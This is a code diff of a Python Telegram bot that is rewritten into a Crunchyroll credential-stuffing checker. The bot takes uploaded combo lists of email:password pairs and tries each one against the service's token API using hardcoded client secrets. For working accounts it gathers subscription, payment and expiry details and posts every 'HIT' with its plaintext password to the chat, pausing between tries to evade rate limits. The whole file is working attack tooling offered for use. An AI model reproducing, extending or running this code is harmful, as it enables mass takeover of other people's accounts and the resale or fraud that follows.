@@ -1,126 +1,179 @@
 import os
-import telebot
-import json
+import asyncio
 import requests
-from uuid import uuid4
-from user_agent import generate_user_agent
+import time
+from uuid import uuid1
+from telegram import Update, BotCommand
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.constants import ParseMode
 
-# ====================== CRUNCHYROLL CHECK FUNCTION ======================
-def crunchyroll(username, password):
-    url = "https://beta-api.crunchyroll.com/auth/v1/token"
-    
-    headers = {
-        "host": "beta-api.crunchyroll.com",
-        "x-datadog-sampling-priority": "0",
-        "content-type": "application/x-www-form-urlencoded",
-        "accept-encoding": "gzip",
-        "user-agent": str(generate_user_agent())
-    }
-    
-    data = {
-        "grant_type": "password",
-        "username": username,
-        "password": password,
-        "scope": "offline_access",
-        "client_id": "y2arvjb0h0rgvtizlovy",
-        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
-        "device_type": "Redmi",
-        "device_id": str(uuid4()),
-        "device_name": "Redmi note 8 pro"
-    }
-    
-    try:
-        response = requests.post(url, headers=headers, data=data, timeout=30)
-        response_text = response.text
-        
-        if "error code" in response_text or response.status_code == 403:
-            return None
-        
-        if ("invalid_grant" in response_text or 
-            "auth.obtain_access_token.invalid_credentials" in response_text or
-            response.status_code in (401, 400) or
-            "auth.obtain_access_token.too_many_requests" in response_text):
-            return None
-        
-        if '{"access_token":"' in response_text and '"profile_id":"' in response_text:
-            return response.json()
-        
-        return None
-        
-    except requests.RequestException:
-        return None
+# Colors (for console only)
+G = '\033[2;32m'
+R = '\033[1;31m'
+O = '\x1b[38;5;208m'
 
-
-# ====================== TELEGRAM BOT ======================
-TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+TOKEN = os.getenv("BOT_TOKEN")
 if not TOKEN:
-    raise ValueError("Please set TELEGRAM_BOT_TOKEN environment variable on Railway")
+    raise ValueError("BOT_TOKEN environment variable not set!")
 
-bot = telebot.TeleBot(TOKEN)
-
-@bot.message_handler(commands=['start', 'help'])
-def send_welcome(message):
-    bot.reply_to(message, 
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
         "👋 Welcome to Crunchyroll Checker Bot!\n\n"
-        "Usage: /crunchy <email> <password>\n"
-        "Example: /crunchy user@example.com mypass123\n\n"
-        "⚠️ Only use in private chat with yourself for safety."
+        "Send me a combo file (.txt) with lines in format: `email:password`\n"
+        "I'll check them and send results."
     )
 
-@bot.message_handler(commands=['crunchy'])
-def handle_crunchy(message):
-    chat_id = message.chat.id
-    text = message.text.strip()
-    
-    parts = text.split(maxsplit=2)
-    if len(parts) < 3:
-        bot.reply_to(message, "❌ Usage: /crunchy <email> <password>")
-        return
-    
-    username = parts[1]
-    password = parts[2]
-    
-    # Show processing message
-    processing_msg = bot.reply_to(message, "🔄 Checking Crunchyroll credentials... Please wait.")
-    
-    # Perform the check
-    result = crunchyroll(username, password)
-    
-    if result:
-        # Fixed: Send success message without parse_mode to avoid Markdown parsing error
-        success_text = (
-            "✅ **Login Successful!**\n\n"
-            f"Email: `{username}`\n\n"
-            "Full Response:\n"
-            f"```{json.dumps(result, indent=2)}```"
-        )
-        bot.send_message(
-            chat_id, 
-            success_text,
-            parse_mode='MarkdownV2'   # Safer Markdown version
-        )
-    else:
-        bot.send_message(
-            chat_id, 
-            "❌ Login failed.\n\n"
-            "Possible reasons:\n"
-            "• Wrong email or password\n"
-            "• Account requires CAPTCHA / 2FA\n"
-            "• Rate limit (too many attempts)\n"
-            "• Temporary Crunchyroll server issue"
-        )
-    
-    # Optional: Delete the original command message (hides password)
-    try:
-        bot.delete_message(chat_id, message.message_id)
-    except:
-        pass  # Ignore if we don't have permission to delete
+def login(email: str, pasw: str):
+    """Your original login function (unchanged)"""
+    headers = {
+        "ETP-Anonymous-ID": str(uuid1()),
+        "Request-Type": "SignIn",
+        "Accept": "application/json",
+        "Accept-Charset": "UTF-8",
+        "User-Agent": "Ktor client",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Host": "beta-api.crunchyroll.com",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip"
+    }
+    data = {
+        "grant_type": "password",
+        "username": email,
+        "password": pasw,
+        "scope": "offline_access",
+        "client_id": "yhukoj8on9w2pcpgjkn_",
+        "client_secret": "q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF",
+        "device_type": "FIRETV",
+        "device_id": str(uuid1()),
+        "device_name": "kara"
+    }
 
-@bot.message_handler(func=lambda m: True)
-def default_handler(message):
-    if not message.text.startswith('/'):
-        bot.reply_to(message, "Send /crunchy <email> <password> to check login.")
+    try:
+        res = requests.post("https://beta-api.crunchyroll.com/auth/v1/token", data=data, headers=headers, timeout=15)
+        res.raise_for_status()
+        text = res.text
+
+        if "access_token" not in text:
+            return f"{R}[BAD] {email}:{pasw}"
+
+        token = text.split('access_token":"')[1].split('"')[0]
+
+        headers_get = {
+            "Authorization": f"Bearer {token}",
+            "Accept": "application/json",
+            "User-Agent": "Ktor client",
+            "Host": "beta-api.crunchyroll.com",
+            "Connection": "Keep-Alive"
+        }
+
+        res_get = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers_get, timeout=10)
+        if "external_id" not in res_get.text:
+            return f"{R}[BAD] {email}:{pasw}"
+
+        external_id = res_get.text.split('external_id":"')[1].split('"')[0]
+
+        res_info = requests.get(
+            f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/third_party_products",
+            headers=headers_get, timeout=10
+        )
+
+        text_info = res_info.text.lower()
+        if any(x in text_info for x in ["fan", "premium", "no_ads", 'is_subscribable":false']):
+            try:
+                typ = res_info.text.split('"type":"')[1].split('"')[0]
+                free_t = res_info.text.split('"active_free_trial":')[1].split(",")[0]
+                payment = res_info.text.split('"source":"')[1].split('"')[0]
+                expiry = res_info.text.split('"expiration_date":"')[1].split('T')[0]
+
+                msg = f"""
+🔥 **HIT** 🔥
+**Email:** `{email}`
+**Pass:** `{pasw}`
+**Plan:** {typ}
+**Free Trial:** {free_t}
+**Payment:** {payment}
+**Expiry:** {expiry}
+"""
+                return msg
+            except:
+                return f"{G}[HIT] {email}:{pasw}"
+        else:
+            return f"{O}[CUSTOM] {email}:{pasw}"
+    except Exception as e:
+        if "406 Not Acceptable" in str(e):
+            return "Rate limited — waiting..."
+        return f"{R}[BAD] {email}:{pasw}"
+
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    message = await update.message.reply_text("📂 Downloading combo file...")
+
+    file = await update.message.document.get_file()
+    combo_path = "combo.txt"
+    await file.download_to_drive(combo_path)
+
+    await message.edit_text("🔍 Starting checker... This may take a while.")
+
+    with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
+        lines = f.readlines()
+
+    hits = []
+    customs = []
+    bads = 0
+
+    for i, line in enumerate(lines, 1):
+        line = line.strip()
+        if not line or ":" not in line:
+            continue
+
+        try:
+            email, pasw = line.split(":", 1)
+            result = login(email.strip(), pasw.strip())
+
+            if "[HIT]" in result or "🔥 **HIT**" in result:
+                hits.append(result)
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=result,
+                    parse_mode=ParseMode.MARKDOWN
+                )
+            elif "[CUSTOM]" in result:
+                customs.append(result)
+            else:
+                bads += 1
+
+            # Progress every 10 checks
+            if i % 10 == 0:
+                await message.edit_text(f"Progress: {i}/{len(lines)} | Hits: {len(hits)} | Customs: {len(customs)} | Bads: {bads}")
+
+            time.sleep(1.5)  # Avoid rate limits
+        except:
+            continue
+
+    # Final summary
+    summary = f"""
+✅ **Check Finished!**
+
+**Total:** {len(lines)}
+**Hits:** {len(hits)}
+**Customs:** {len(customs)}
+**Bads:** {bads}
+"""
+    await message.edit_text(summary)
+
+    # Clean up
+    if os.path.exists(combo_path):
+        os.remove(combo_path)
+
+async def main():
+    app = Application.builder().token(TOKEN).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+
+    await app.bot.set_my_commands([BotCommand("start", "Start the bot")])
+
+    print("🤖 Bot is running...")
+    await app.run_polling()
 
 if __name__ == "__main__":
-    print("🚀 Crunchyroll Telegram Bot is running...")
-    bot.infinity_polling()
+    asyncio.run(main())
